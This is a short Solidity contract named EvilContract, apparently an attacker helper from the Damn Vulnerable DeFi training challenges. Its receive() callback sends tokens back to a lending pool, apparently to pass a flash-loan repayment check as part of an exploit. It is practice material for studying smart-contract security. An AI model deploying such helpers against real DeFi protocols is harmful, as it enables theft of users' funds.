// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/Address.sol";

contract EvilContract {
    using Address for address;

    IERC20 public immutable damnValuableToken;
    address payable private pool;

    constructor (address payable payablePool, address token) {
        pool = payablePool;
        damnValuableToken = IERC20(token);
    }

    receive() external payable {
        damnValuableToken.transfer(pool, 1 ether);
    }
}